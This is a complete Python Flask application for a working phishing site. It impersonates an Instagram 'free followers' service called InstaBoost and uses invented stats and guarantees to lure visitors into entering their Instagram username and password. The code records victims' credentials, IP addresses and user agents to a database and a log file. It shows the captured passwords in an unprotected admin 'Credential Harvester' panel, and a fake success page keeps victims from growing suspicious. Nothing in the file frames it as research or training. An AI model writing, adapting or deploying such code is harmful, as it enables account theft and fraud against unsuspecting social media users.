from flask import Flask, render_template_string, request, redirect, url_for, jsonify
import sqlite3
import logging
from datetime import datetime
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='creds.log', level=logging.INFO,
                    format='%(asctime)s | %(message)s')

# HTML Templates (embedded)
INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaBoost - Get More Instagram Followers</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Poppins', sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            min-height: 100vh; 
            overflow-x: hidden; 
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 40px 0; position: relative; }
        .instagram-icon { font-size: 4rem; color: #E4405F; margin-bottom: 20px; animation: pulse 2s infinite; filter: drop-shadow(0 0 20px rgba(228, 64, 95, 0.5)); }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .logo h1 { font-size: 3.5rem; background: linear-gradient(45deg, #fff, #f0f0f0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-weight: 700; margin-bottom: 10px; }
        .tagline { font-size: 1.2rem; color: rgba(255, 255, 255, 0.9); font-weight: 300; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 50px 0; }
        .stat-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); border-radius: 20px; padding: 30px 20px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.2); transition: all 0.3s ease; }
        .stat-card:hover { transform: translateY(-10px); background: rgba(255, 255, 255, 0.2); }
        .stat-number { font-size: 2.5rem; font-weight: 700; background: linear-gradient(45deg, #E4405F, #F77737); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 10px; }
        .stat-label { color: rgba(255, 255, 255, 0.9); font-weight: 500; }
        .main-section { display: grid; grid-template-columns: 1fr 1fr; gap: 50px; margin: 60px 0; align-items: center; }
        .content { color: white; }
        .content h2 { font-size: 2.5rem; margin-bottom: 20px; line-height: 1.2; }
        .features { list-style: none; margin: 30px 0; }
        .features li { padding: 15px 0; font-size: 1.1rem; position: relative; padding-left: 40px; }
        .features li::before { content: "✓"; position: absolute; left: 0; color: #E4405F; font-size: 1.5rem; font-weight: bold; }
        .cta-button { background: linear-gradient(45deg, #E4405F, #F77737); color: white; border: none; padding: 18px 40px; font-size: 1.2rem; font-weight: 600; border-radius: 50px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 10px 30px rgba(228, 64, 95, 0.4); margin-top: 20px; }
        .cta-button:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(228, 64, 95, 0.6); }
        .phone-mockup { position: relative; width: 300px; height: 600px; margin: 0 auto; }
        .phone { width: 100%; height: 100%; background: #000; border-radius: 40px; position: relative; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), inset 0 2px 10px rgba(255, 255, 255, 0.1); }
        .phone::before { content: ''; position: absolute; top: 20px; left: 50%; transform: translateX(-50%); width: 120px; height: 5px; background: #333; border-radius: 10px; }
        .screen { width: 90%; height: 92%; background: #000; border-radius: 25px; position: absolute; top: 6%; left: 5%; overflow: hidden; }
        .instagram-feed { height: 100%; position: relative; background: linear-gradient(180deg, #1e1e1e 0%, #000 100%); }
        .follower-count { position: absolute; top: 20px; left: 20px; right: 20px; background: linear-gradient(45deg, #E4405F, #F77737); color: white; padding: 15px; border-radius: 15px; text-align: center; font-weight: 700; font-size: 1.1rem; animation: bounce 2s infinite; }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-10px); } 60% { transform: translateY(-5px); } }
        .counter { font-size: 2rem !important; font-weight: 800 !important; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; backdrop-filter: blur(10px); }
        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 90%; }
        .close { position: absolute; top: 15px; right: 20px; font-size: 2rem; cursor: pointer; color: #999; }
        .login-form input { width: 100%; padding: 15px; border: 2px solid #E4405F; border-radius: 10px; font-size: 1.1rem; margin-bottom: 15px; text-align: center; box-sizing: border-box; }
        .login-form input:focus { outline: none; border-color: #F77737; box-shadow: 0 0 10px rgba(228, 64, 95, 0.3); }
        .password-toggle { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #E4405F; }
        @media (max-width: 768px) { .main-section { grid-template-columns: 1fr; text-align: center; } .logo h1 { font-size: 2.5rem; } }
        .particle { position: absolute; width: 4px; height: 4px; background: rgba(255, 255, 255, 0.5); border-radius: 50%; animation: float 6s infinite linear; }
        .particle:nth-child(1) { top: 10%; left: 10%; animation-delay: 0s; }
        .particle:nth-child(2) { top: 20%; right: 15%; animation-delay: 1s; }
        .particle:nth-child(3) { bottom: 30%; left: 20%; animation-delay: 2s; }
        .particle:nth-child(4) { top: 60%; right: 25%; animation-delay: 3s; }
        @keyframes float { 0% { transform: translateY(0px) rotate(0deg); opacity: 1; } 100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; } }
    </style>
</head>
<body>
    <div class="particle"></div><div class="particle"></div><div class="particle"></div><div class="particle"></div>
    <div class="container">
        <header class="header">
            <div class="instagram-icon"><i class="fab fa-instagram"></i></div>
            <div class="logo">
                <h1>InstaBoost</h1>
                <p class="tagline">Boost Your Instagram Presence Instantly</p>
            </div>
        </header>
        <section class="stats">
            <div class="stat-card"><div class="stat-number" data-target="250K">0</div><div class="stat-label">Happy Users</div></div>
            <div class="stat-card"><div class="stat-number" data-target="1M">0</div><div class="stat-label">Followers Delivered</div></div>
            <div class="stat-card"><div class="stat-number" data-target="99">0</div><div class="stat-label">% Success Rate</div></div>
            <div class="stat-card"><div class="stat-number" data-target="24">0</div><div class="stat-label">Hours Delivery</div></div>
        </section>
        <section class="main-section">
            <div class="content">
                <h2>Real & Active Instagram Followers</h2>
                <ul class="features">
                    <li>100% Real & Active Instagram Users</li>
                    <li>Instant Delivery - Start in Minutes</li>
                    <li>Full Money-Back Guarantee</li>
                    <li>Safe & Permanent Followers</li>
                    <li>24/7 Customer Support</li>
                </ul>
                <button class="cta-button" onclick="openModal()">
                    <i class="fab fa-instagram"></i> Get Free Followers Now
                </button>
            </div>
            <div class="phone-mockup">
                <div class="phone">
                    <div class="screen">
                        <div class="instagram-feed">
                            <div class="follower-count">
                                <div>Your Followers: <span class="counter" id="liveCounter">1,247</span></div>
                                <div style="font-size: 0.9rem; margin-top: 5px;">Growing live...</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
    <div id="modal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <div style="font-size: 2rem; margin-bottom: 20px; color: #E4405F;"><i class="fab fa-instagram"></i></div>
            <h2>Login to Start Boost</h2>
            <p style="color: #666; margin-bottom: 30px;">Enter credentials to verify account & get 100 FREE followers</p>
            <form id="loginForm" method="POST" action="/capture" class="login-form">
                <div style="position: relative; margin-bottom: 15px;">
                    <input type="text" name="username" id="username" placeholder="@yourusername" required>
                </div>
                <div style="position: relative; margin-bottom: 20px;">
                    <input type="password" name="password" id="password" placeholder="Password" required>
                    <i class="fas fa-eye password-toggle" onclick="togglePassword()"></i>
                </div>
                <input type="hidden" name="ip" id="ipAddress">
                <input type="hidden" name="useragent" id="userAgent">
                <button type="submit" class="cta-button" style="width: 100%;">
                    🚀 Verify & Start Boost (100 FREE Followers)
                </button>
            </form>
        </div>
    </div>
    <script>
        function animateCounters(){const counters=document.querySelectorAll('.stat-number');counters.forEach(counter=>{const target=parseInt(counter.getAttribute('data-target')),increment=target/200,updateCounter=()=>{current<target?(current+=increment,counter.textContent=Math.floor(current)+(target>1000?'K':'%'),requestAnimationFrame(updateCounter)):counter.textContent=target+(target>1000?'K':'%')};let current=0;updateCounter()})}
        function animateLiveCounter(){let count=1247;const counter=document.getElementById('liveCounter');setInterval(()=>{count+=Math.floor(Math.random()*5)+1;counter.textContent=count.toLocaleString()},2000)}
        function openModal(){document.getElementById('modal').style.display='block';fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(data=>document.getElementById('ipAddress').value=data.ip).catch(()=>document.getElementById('ipAddress').value='unknown');document.getElementById('userAgent').value=navigator.userAgent}
        function closeModal(){document.getElementById('modal').style.display='none'}
        function togglePassword(){const pwd=document.getElementById('password'),toggle=document.querySelector('.password-toggle');pwd.type=pwd.type==='password'?'text':'password';toggle.classList.toggle('fa-eye');toggle.classList.toggle('fa-eye-slash')}
        window.addEventListener('load',()=>{animateCounters();animateLiveCounter()});window.onclick=e=>{e.target.id==='modal'&&closeModal()}
    </script>
</body>
</html>
"""

SUCCESS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Success!</title>
    <style>body{background:#000;color:#fff;text-align:center;padding:100px;font-family:Arial;font-size:1.5rem;}</style>
</head>
<body>
    <h1 style="color:#E4405F;font-size:3rem;">✅ Boost Started Successfully!</h1>
    <p>Processing 100 FREE followers for @{{ username }}...<br><br>Check back in 5 minutes! 🚀</p>
    <script>
        setTimeout(()=>{alert('🎉 Boost activated! Check your Instagram in 5 minutes!\\n\\n100 FREE followers delivered to @{{ username }} 🚀');window.location.href='/'},3000);
    </script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Captured Credentials - Admin</title>
    <style>
        body{font-family:'Segoe UI',sans-serif;margin:0;padding:20px;background:#1a1a1a;color:#fff;}
        .header{background:linear-gradient(45deg,#E4405F,#F77737);padding:20px;border-radius:10px;margin-bottom:20px;}
        .stats{display:flex;gap:20px;margin-bottom:30px;}
        .stat{background:rgba(255,255,255,0.1);padding:15px 25px;border-radius:10px;text-align:center;flex:1;}
        table{width:100%;border-collapse:collapse;background:#2a2a2a;border-radius:10px;overflow:hidden;}
        th,td{padding:15px;text-align:left;border-bottom:1px solid #444;}
        th{background:#333;font-weight:600;}
        .username{color:#E4405F;font-weight:bold;}
        .password{background:#ff4444;color:white;padding:5px 10px;border-radius:5px;font-family:monospace;}
        .copy-btn{background:#4CAF50;color:white;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;}
        tr:hover{background:#333;}
    </style>
</head>
<body>
    <div class="header">
        <h1><i class="fab fa-instagram"></i> InstaBoost Credential Harvester</h1>
        <div class="stats">
            <div class="stat"><h2>{{ total }}</h2><p>Total Captured</p></div>
        </div>
    </div>
    <table>
        <thead><tr><th>ID</th><th>Username</th><th>Password</th><th>IP</th><th>User Agent</th><th>Time</th></tr></thead>
        <tbody>
            {% for cred in creds %}
            <tr>
                <td>{{ cred[0] }}</td>
                <td class="username">@{{ cred[1] }}</td>
                <td class="password">{{ cred[2] }} 
                    <button class="copy-btn" onclick="copyPassword('{{ cred[2] }}')">Copy</button>
                </td>
                <td>{{ cred[3] }}</td>
                <td style="font-size:0.9em;max-width:300px;">{{ cred[4][:100] }}...</td>
                <td>{{ cred[5] }}</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
    <script>
        function copyPassword(pwd){
            navigator.clipboard.writeText(pwd).then(()=>{ 
                const btn=event.target; 
                btn.textContent='Copied!'; 
                setTimeout(()=>btn.textContent='Copy',2000);
            });
        }
    </script>
</body>
</html>
"""

# Initialize SQLite database
def init_db():
    conn = sqlite3.connect('creds.db')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS captured_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

# Store captured credentials
def store_creds(username, password, ip, user_agent):
    conn = sqlite3.connect('creds.db')
    conn.execute('INSERT INTO captured_creds (username, password, ip, user_agent) VALUES (?, ?, ?, ?)',
                (username, password, ip, user_agent))
    conn.commit()
    
    # Log to file
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] @{username} | {password} | {ip}"
    logging.info(log_entry)
    
    conn.close()

# Get credentials for admin panel
def get_creds():
    conn = sqlite3.connect('creds.db')
    cursor = conn.execute('SELECT * FROM captured_creds ORDER BY timestamp DESC LIMIT 100')
    creds = cursor.fetchall()
    conn.close()
    return creds

def get_total_creds():
    conn = sqlite3.connect('creds.db')
    total = conn.execute('SELECT COUNT(*) FROM captured_creds').fetchone()[0]
    conn.close()
    return total

@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    if username and password:
        store_creds(username, password, ip, user_agent)
        print(f"🎣 CAPTURED: @{username}:{password} from {ip}")
    
    return redirect(url_for('success', username=username or 'user'))

@app.route('/success')
def success():
    username = request.args.get('username', 'user')
    return render_template_string(SUCCESS_HTML, username=username)

@app.route('/admin')
def admin():
    creds = get_creds()
    total = get_total_creds()
    return render_template_string(ADMIN_HTML, creds=creds, total=total)

@app.route('/stats')
def stats():
    return jsonify({'total': get_total_creds()})

@app.route('/clear')
def clear_db():
    conn = sqlite3.connect('creds.db')
    conn.execute('DELETE FROM captured_creds')
    conn.commit()
    conn.close()
    return 'Database cleared!'

if __name__ == '__main__':
    init_db()
    print("🚀 InstaBoost Phishing Server Running:")
    print("📱 Main site: http://localhost:5000")
    print("👨‍💼 Admin:    http://localhost:5000/admin")
    print("📊 Stats:     http://localhost:5000/stats")
    print("🗑️  Clear:    http://localhost:5000/clear")
    print("\n📁 Data stored in: creds.db + creds.log")
    app.run(debug=False, host='0.0.0.0', port=5000)